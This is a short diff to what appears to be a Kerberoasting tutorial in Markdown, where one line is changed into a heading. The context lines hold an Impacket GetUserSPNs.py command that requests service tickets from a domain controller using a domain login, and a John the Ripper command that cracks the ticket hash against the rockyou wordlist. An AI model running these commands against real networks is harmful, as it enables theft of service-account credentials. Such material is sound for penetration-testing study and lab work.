@@ -154,7 +154,7 @@ python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-
   
 <img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="1000" height="300"> 
 
-crack hash with john
+## crack hash with john
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt tgs
 ```
